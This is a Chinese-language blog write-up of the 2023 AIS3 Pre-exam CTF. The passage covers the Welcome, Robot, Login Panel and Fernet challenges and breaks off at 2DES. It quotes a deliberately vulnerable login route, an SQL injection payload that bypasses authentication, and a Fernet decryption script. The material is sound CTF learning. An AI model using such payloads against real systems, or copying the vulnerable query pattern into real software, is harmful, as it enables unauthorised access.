<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2023 AIS3 Pre-exam Write Up | M3t30r</title><meta name="keywords" content="AIS3,Security,CTF"><meta name="author" content="Albert Huang,alb105322129@gmail.com"><meta name="copyright" content="Albert Huang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="今年是我打AIS3 Pre-Exam的第三年，今年的目標原本只是比去年的52名好就可以了，沒想到居然打進了前10，至今仍覺得不可思議.w.(當然比較大的可能性是大佬都跑去出題ㄌ:P)今年解出的題目分數也都比較高，去年解的題目大部分都是降到100分XD總之很驚訝自己今年可以拿到第9名，也希望自己可以持續進步! AIS3官方網站  MiscWelcome [100]Are you not a robo">
<meta property="og:type" content="article">
<meta property="og:title" content="2023 AIS3 Pre-exam Write Up">
<meta property="og:url" content="http://albert-notes.github.io/2023/05/27/AIS3-2023-preexam/index.html">
<meta property="og:site_name" content="M3t30r">
<meta property="og:description" content="今年是我打AIS3 Pre-Exam的第三年，今年的目標原本只是比去年的52名好就可以了，沒想到居然打進了前10，至今仍覺得不可思議.w.(當然比較大的可能性是大佬都跑去出題ㄌ:P)今年解出的題目分數也都比較高，去年解的題目大部分都是降到100分XD總之很驚訝自己今年可以拿到第9名，也希望自己可以持續進步! AIS3官方網站  MiscWelcome [100]Are you not a robo">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://albert-notes.github.io/img/ais4.jpg">
<meta property="article:published_time" content="2023-05-27T14:49:43.000Z">
<meta property="article:modified_time" content="2023-06-23T02:45:08.365Z">
<meta property="article:author" content="Albert Huang">
<meta property="article:tag" content="AIS3">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://albert-notes.github.io/img/ais4.jpg"><link rel="shortcut icon" href="/img/fav.ico"><link rel="canonical" href="http://albert-notes.github.io/2023/05/27/AIS3-2023-preexam/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-06-23 10:45:08'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="M3t30r" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/alb.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/videos/"><i class="fa-fw fas fa-desktop"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/certificates/"><i class="fa-fw fas fa-certificate"></i><span> Certificates</span></a></div><div class="menus_item"><a class="site-page" href="/resources/"><i class="fa-fw fas fa-lightbulb"></i><span> Resources</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-address-card"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/ais4.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">M3t30r</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/videos/"><i class="fa-fw fas fa-desktop"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/certificates/"><i class="fa-fw fas fa-certificate"></i><span> Certificates</span></a></div><div class="menus_item"><a class="site-page" href="/resources/"><i class="fa-fw fas fa-lightbulb"></i><span> Resources</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-address-card"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023 AIS3 Pre-exam Write Up</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-05-27T14:49:43.000Z" title="Created 2023-05-27 22:49:43">2023-05-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-06-23T02:45:08.365Z" title="Updated 2023-06-23 10:45:08">2023-06-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Computer-Science/">Computer Science</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">6.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>31min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023 AIS3 Pre-exam Write Up"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>今年是我打AIS3 Pre-Exam的第三年，今年的目標原本只是比去年的52名好就可以了，沒想到居然打進了前10，至今仍覺得不可思議.w.(當然比較大的可能性是大佬都跑去出題ㄌ:P)今年解出的題目分數也都比較高，去年解的題目大部分都是降到100分XD總之很驚訝自己今年可以拿到第9名，也希望自己可以持續進步!</p>
<p><a target="_blank" rel="noopener" href="https://ais3.org/">AIS3官方網站</a></p>
<p><img src="https://imgur.com/HGS2cIs.png"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome-100"><a href="#Welcome-100" class="headerlink" title="Welcome [100]"></a>Welcome [100]</h2><div class="note default flat"><p>Are you not a robot ?<br>FLAG Format: <code>^AIS3{[A-Z0-9+-*/!?-]+}$</code></p>
<p>Author: nella17</p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1OU5R736aRgj9KLce9S4CQj0qsDA6tm2g/view?usp=sharing">https://drive.google.com/file/d/1OU5R736aRgj9KLce9S4CQj0qsDA6tm2g/view?usp=sharing</a></p>
</blockquote>
<p>這題題目給了一個pdf，每張不同大小和形狀的紙裡面各包含了1個flag的字元，只要把他們通通拼在一起即可拿到flag。要注意題目中的Regex並沒有<code>_</code>，所以flag是以<code>-</code>來進行連接。</p>
<p>FLAG: <code>AIS3&#123;WELCOME-TO-2023-PRE-EXAM&amp;MY-FIRST-CTF&#125;</code></p>
<h2 id="Robot-100"><a href="#Robot-100" class="headerlink" title="Robot [100]"></a>Robot [100]</h2><div class="note default flat"><p>Are you a robot?</p>
<p>Note: This is NOT a reversing or pwn challenge. Don’t reverse the binary. It is for local testing only. You will actually get the flag after answering all the questions. You can practice locally by running <code>./robot AIS3{fake_flag} 127.0.0.1 1234</code> and it will run the service on <code>localhost:1234</code>.</p>
<p>Author: toxicpie</p>
<p><code>nc chals1.ais3.org 12348</code></p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1cczdP1CntYpbMrU5kD_mf3_Gv3DNYTQe/view?usp=sharing">https://drive.google.com/file/d/1cczdP1CntYpbMrU5kD_mf3_Gv3DNYTQe/view?usp=sharing</a></p>
</blockquote>
<p>這題用nc連進去之後會發現要在90秒內做出30道數學題，由於數字很小很容易心算，而且中間又有空格，code需要一點特判，所以我決定直接用心算解完30道數學題之後就能拿到flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">$ nc chals1.ais3.org 12348</span><br><span class="line">Timeout is 90 seconds</span><br><span class="line">Answer 30 easy math questions to get the flag. Let&#x27;s go!</span><br><span class="line">9       +       1</span><br><span class="line">10</span><br><span class="line">5               *               2</span><br><span class="line">10</span><br><span class="line">5  *  10</span><br><span class="line">50</span><br><span class="line">8+7</span><br><span class="line">15</span><br><span class="line">2 + 2</span><br><span class="line">4</span><br><span class="line">4  +  8</span><br><span class="line">12</span><br><span class="line">5       *       2</span><br><span class="line">10</span><br><span class="line">7 * 6</span><br><span class="line">42</span><br><span class="line">3       +       3</span><br><span class="line">6</span><br><span class="line">4       +       6</span><br><span class="line">10</span><br><span class="line">4        +       3</span><br><span class="line">7</span><br><span class="line">2*10</span><br><span class="line">20</span><br><span class="line">7       +       3</span><br><span class="line">10</span><br><span class="line">5  *  6</span><br><span class="line">30</span><br><span class="line">9  +  7</span><br><span class="line">16</span><br><span class="line">5        *       7</span><br><span class="line">35</span><br><span class="line">4 + 2</span><br><span class="line">6</span><br><span class="line">2       *       4</span><br><span class="line">8</span><br><span class="line">6*4</span><br><span class="line">24</span><br><span class="line">10      +       7</span><br><span class="line">17</span><br><span class="line">5       +       7</span><br><span class="line">12</span><br><span class="line">4               *               3</span><br><span class="line">12</span><br><span class="line">1        *       4</span><br><span class="line">4</span><br><span class="line">4       *       1</span><br><span class="line">4</span><br><span class="line">9+2</span><br><span class="line">11</span><br><span class="line">9*4</span><br><span class="line">36</span><br><span class="line">3        +       3</span><br><span class="line">6</span><br><span class="line">8 + 10</span><br><span class="line">18</span><br><span class="line">1*7</span><br><span class="line">7</span><br><span class="line">8+5</span><br><span class="line">13</span><br><span class="line">Congratulations! Flag: AIS3&#123;don&#x27;t_eval_unknown_code_or_pipe_curl_to_sh&#125;</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>AIS3&#123;don&#39;t_eval_unknown_code_or_pipe_curl_to_sh&#125;</code></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login-Panel-100"><a href="#Login-Panel-100" class="headerlink" title="Login Panel [100]"></a>Login Panel [100]</h2><div class="note default flat"><p>Login Panel 網站採用了隱形 reCAPTCHA 作為防護機制，以確保只有人類的使用者能夠登入 admin 的帳號。你的任務是找到一個方法來繞過 reCAPTCHA，成功登入 admin 的帳號。</p>
<p>你可以使用各種技術和手段來達成目標，可能需要進行一些網站分析、程式碼解讀或其他形式的攻擊。請注意，你需要遵守道德規範，不得進行任何非法或有害的行為。</p>
<p>當你成功登入 admin 的帳號後，你將能夠獲得 FLAG。請將 FLAG 提交至挑戰平台，以證明你的成功。</p>
<p>Author: Ching367436</p>
<p><a target="_blank" rel="noopener" href="http://chals1.ais3.org:8000/">http://chals1.ais3.org:8000/</a></p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1G-VtgJFEKcfN0Xj_wRZLLfXuoxPvR3tM/view?usp=sharing">https://drive.google.com/file/d/1G-VtgJFEKcfN0Xj_wRZLLfXuoxPvR3tM/view?usp=sharing</a></p>
</blockquote>
<p>這題先看source code，可以發現在<code>/login</code>的地方，變數直接被塞到SQL expression裡面，是一個典型的SQL Injection。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, recaptcha.<span class="property">middleware</span>.<span class="property">verify</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span></span><br><span class="line">    db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">$&#123;password&#125;</span>&#x27;`</span>, <span class="keyword">async</span> (err, row) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=dQw4w9WgXcQ`</span>)</span><br><span class="line">        <span class="keyword">if</span> (!row) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_credentials`</span>)</span><br><span class="line">        <span class="keyword">if</span> (row.<span class="property">username</span> !== username) &#123;</span><br><span class="line">            <span class="comment">// special case</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=E6jbBLrxY1U`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">recaptcha</span>.<span class="property">error</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">recaptcha</span>.<span class="property">error</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_captcha`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/2fa&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>而目標是登入<code>admin</code>，但code中說明如果我們輸入的東西與username不符，就會跳出rickroll，所以我們可以注入的地方在<code>password</code>，只要使用payload<code>admin&#39; OR 1=1--</code>就可以直接登入。</p>
<p><img src="https://imgur.com/mvNyz9i.png"></p>
<p>登入之後會進入<code>/2FA</code>，但從source code中可以看出，這其實沒有對<code>/dashboard</code>做任何防護，所以直接跳到<code>/dashboard</code>就可以得到flag了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/2fa&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; code &#125; = req.<span class="property">body</span></span><br><span class="line">        db.<span class="title function_">get</span>(<span class="string">`SELECT code FROM Users WHERE username = &#x27;<span class="subst">$&#123;req.session.username&#125;</span>&#x27;`</span>, <span class="function">(<span class="params">err, row</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=dQw4w9WgXcQ`</span>)</span><br><span class="line">            <span class="keyword">if</span> (row.<span class="property">code</span> === code)</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/2fa?msg=invalid_code&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><img src="https://imgur.com/DJbAl3J.png"></p>
<p>FLAG: <code>AIS3&#123;&#39; UNION SELECT 1, 1, 1, 1 WHERE (&#123;condition&#125;)--&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Fernet-100"><a href="#Fernet-100" class="headerlink" title="Fernet [100]"></a>Fernet [100]</h2><div class="note default flat"><p>你所在的公司最近發生了一起駭客入侵事件，管理員發現駭客使用 Fernet 密碼學來加密了他們的敏感數據。你需要解開被加密的檔案，否則事情就大條了！</p>
<p>flag format : <code>FLAG{xxx}</code></p>
<p>Auther : Richard ( dogxxx)</p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/15q0Ty6A7tWm6cPBP2UMWYz1yJcfN0tEM/view?usp=sharing">https://drive.google.com/file/d/15q0Ty6A7tWm6cPBP2UMWYz1yJcfN0tEM/view?usp=sharing</a></p>
</blockquote>
<p>這題一樣直接看source code，可以發現他是利用Fernet來進行加密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, password</span>):</span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)  </span><br><span class="line">    key = PBKDF2(password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">    f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line">    ciphertext = f.encrypt(plaintext.encode())  </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(salt + ciphertext).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">plaintext = FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># Encrypt</span></span><br><span class="line">ciphertext = encrypt(plaintext, leak_password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted data:&quot;</span>,ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Encrypted data:iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj</span></span><br></pre></td></tr></table></figure>

<p>從code裡面可以知道，他的key是利用password與salt使用PBKDF2生成，但password和salt都是已知，可以分別從source code和output中得到，因此我們可以直接造出一模一樣的key來對加密的東西進行解密。將這段code稍作修改後就能作為exploit拿來decrypt，得到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, password, salt</span>):</span><br><span class="line">    key = PBKDF2(password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)</span><br><span class="line">    f = Fernet(base64.urlsafe_b64encode(key))</span><br><span class="line">    plaintext = f.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">ciphertext = base64.b64decode(<span class="string">b&#x27;iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj&#x27;</span>)</span><br><span class="line">salt = ciphertext[:<span class="number">16</span>]</span><br><span class="line">ciphertext = ciphertext[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypt(ciphertext, leak_password, salt))</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>FLAG&#123;W3lc0m3_t0_th3_CTF_W0rld_!!_!!!_!&#125;</code></p>
<h2 id="2DES-484"><a href="#2DES-484" class="headerlink" title="2DES [484]"></a>2DES [484]</h2><div class="note default flat"><p>「2DES 」是一個刺激的「Capture the Flag」（CTF）挑戰，考驗你在解密使用 Double DES（2DES）加密的數據方面的技能。準備好進入密碼學的世界，解開這個加密訊息中隱藏的秘密。</p>
<p>在這個挑戰中，你將面對一個使用 2DES 加密算法保護的加密訊息。你的任務是解密這個訊息並恢復原始明文。為了做到這一點，你需要深入了解密碼學原理，並能夠運用各種技術來破解加密。</p>
<p>你準備好踏上這個激動人心的解密之旅，揭示這個訊息中隱藏的秘密了嗎？加入我們的「2DES 加密 CTF 挑戰」，在迷人的密碼學世界中展示你的技巧吧！</p>
<p>Author: Ching367436</p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1IFZz-1Q0En15uO6MehLM35cxDMZA6Sip/view?usp=sharing">https://drive.google.com/file/d/1IFZz-1Q0En15uO6MehLM35cxDMZA6Sip/view?usp=sharing</a></p>
</blockquote>
<p>這題的題目已經很明顯地暗示這題是Double DES了，而其最常見的攻擊手法就是Meet In The Middle(MITM)中間相遇攻擊，因此可以直接利用這個弱點來進行攻擊，分別拿到key1與key2。</p>
